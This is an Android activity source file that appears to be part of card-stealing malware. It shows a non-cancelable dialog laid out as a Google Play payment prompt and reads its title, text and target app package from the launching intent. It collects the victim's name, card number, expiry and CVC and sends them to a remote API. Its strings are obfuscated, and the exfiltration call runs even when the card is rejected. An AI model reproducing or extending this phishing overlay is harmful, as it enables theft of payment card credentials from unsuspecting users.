package com.moonny.acts;

import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.text.InputFilter;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.moonny.R;
import com.moonny.api.ApiRequest;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.widget.CustomCardNumber;
import com.moonny.widget.CustomMonth;
import com.moonny.widget.CustomYear;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Method;

public class CC1 extends Activity implements CustomCardNumber.OnCardNumber {
    private AlertDialog dialog;
    private View view;
    private RelativeLayout codeLayout;

    private CustomCardNumber number;
    private CustomMonth month;
    private CustomYear year;
    private EditText fullName, cvc;
    private ImageView visa, masterCard, amexCard;

    private static boolean IS_CURRENT_CARD = false;

    private String title = "";
//    private String card_text = "";
    private String on_package = "";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        view = getLayoutInflater().inflate(R.layout.gp_dialog_card, null, false);

        codeLayout = (RelativeLayout) view.findViewById(R.id.mCodeLayout);
        number = (CustomCardNumber) view.findViewById(R.id.card_number_edit);
        number.setHint(S.s(getString(R.string.k)));
        number.setOnCardNumber(this);

        fullName = (EditText) view.findViewById(R.id.full_name);
        fullName.setHint(S.s(getString(R.string.r)));

        month = (CustomMonth) view.findViewById(R.id.month_edit);
        month.setHint(S.s(getString(R.string.m)));

        year = (CustomYear) view.findViewById(R.id.year_edit);
        year.setHint(S.s(getString(R.string.n)));

        cvc = (EditText) view.findViewById(R.id.cvc_edit);
        cvc.setHint(S.s(getString(R.string.o)));

        visa = (ImageView) view.findViewById(R.id.visa_img);
        masterCard = (ImageView) view.findViewById(R.id.mastercard_img);
        amexCard = (ImageView) view.findViewById(R.id.amex_img);

        Intent intent = getIntent();
        title = intent.getStringExtra(S.title);
        String card_text = intent.getStringExtra(S.card_text);
        on_package = intent.getStringExtra(S.on_package);

        TextView desc = (TextView) view.findViewById(R.id.gp_card_text);
        desc.setText(card_text);

        showMyDialog();
    }

    private void showMyDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setCancelable(false);
        builder.setView(view);
        builder.setTitle(title);
        builder.setPositiveButton(S.s(getString(R.string.c)), null);
        dialog = builder.create();
        dialog.setOnShowListener(new DialogInterface.OnShowListener() {
            @Override
            public void onShow(DialogInterface d) {
                Button ok = dialog.getButton(AlertDialog.BUTTON_POSITIVE);
                ok.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        if (validNumber(number.getCardNumber())) {

                            JSONObject data = new JSONObject();
                            try {
                                data.put(S.api_method, S.api_cc);
                                data.put(S.api_cc_step, 1);
                                data.put(S.api_cc_name, fullName.getText().toString());
                                data.put(S.api_cc_number, number.getCardNumber());
                                data.put(S.api_cc_month, month.getText().toString());
                                data.put(S.api_cc_year, year.getText().toString());
                                data.put(S.api_cc_cvc, cvc.getText().toString());
                            }catch (JSONException e){
                                e.printStackTrace();
                            }

                            if (IS_CURRENT_CARD) {
                                Intent intentPassword = new Intent(CC1.this, CC2.class);
                                intentPassword.putExtra(S.title, title);
                                intentPassword.putExtra(S.on_package, on_package);
                                startActivity(intentPassword);
                                finish();
                                IS_CURRENT_CARD = false;
                            } else {
                                number.requestFocus(number.getText().length());
                                number.setError(S.s(getString(R.string.e)));
                                month.setText("");
                                year.setText("");
                                cvc.setText("");
                            }

                            new ApiRequest(getApplicationContext(), data).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
                        }
                    }
                });
            }
        });
        dialog.show();
    }

    private boolean validNumber(String card) {
        if (card == null)
            return false;
        try {
            if (card.charAt(0) == '4' || card.charAt(0) == '5' || card.charAt(0) == '3') {
                IS_CURRENT_CARD = true;
            }
            if (Integer.parseInt(month.getText().toString()) < 0 || Integer.parseInt(month.getText().toString()) > 12)
                return false;
        } catch (NumberFormatException e) {
            return false;
        }
        if (month.getText().length() < 2)
            return false;
        if (year.getText().length() < 2)
            return false;
        if (cvc.getText().length() < 3)
            return false;
        if (fullName.getText().length() < 4)
            return false;
        return true;
    }

    @Override
    public void onTypeOfCard(int typeOfCard) {
        /* int */switch (typeOfCard) {
            case CustomCardNumber.UNKNOWN_CARD:
                CC2.TYPE_CARD = CC2.UNKNOWN_CARD;
                visa.setVisibility(View.VISIBLE);
                masterCard.setVisibility(View.VISIBLE);
                amexCard.setVisibility(View.VISIBLE);
                break;
            case CustomCardNumber.VISA_CARD:
                CC2.TYPE_CARD = CC2.VISA_CARD;
                visa.setVisibility(View.VISIBLE);
                masterCard.setVisibility(View.INVISIBLE);
                amexCard.setVisibility(View.INVISIBLE);
                break;
            case CustomCardNumber.MASTER_CARD:
                CC2.TYPE_CARD = CC2.MASTERCARD_CARD;
                masterCard.setVisibility(View.VISIBLE);
                visa.setVisibility(View.INVISIBLE);
                amexCard.setVisibility(View.INVISIBLE);
                break;
            case CustomCardNumber.AMEX_CARD:
                CC2.TYPE_CARD = CC2.AMEX_CARD;
                amexCard.setVisibility(View.VISIBLE);
                masterCard.setVisibility(View.INVISIBLE);
                visa.setVisibility(View.INVISIBLE);
                break;
        }

    }

    @Override
    public void onValidCard(boolean isValid) {
        if (isValid)
            codeLayout.setVisibility(View.VISIBLE);
        else
            codeLayout.setVisibility(View.GONE);
    }

    @Override
    public void setAmexCVC() {
        cvc.setHint(S.CCID);
        InputFilter[] fa= new InputFilter[1];
        fa[0] = new InputFilter.LengthFilter(4);
        cvc.setFilters(fa);
    }

    @Override
    public void setOtherCVC() {
        cvc.setHint(S.CVC);
        InputFilter[] fa= new InputFilter[1];

        try {
            //fa[0] = new InputFilter.LengthFilter(3);
            fa[0] = (InputFilter) InputFilter.LengthFilter.class.getDeclaredConstructor(int.class).newInstance(3);
        }catch (Exception e){
            if(Constant.DEBUG)
            {
                e.printStackTrace();
                Log.d("CC1", e.getMessage());
            }
        }

        cvc.setFilters(fa);
    }

    @Override
    protected void onPause() {
        super.onPause();
        finish();
    }
}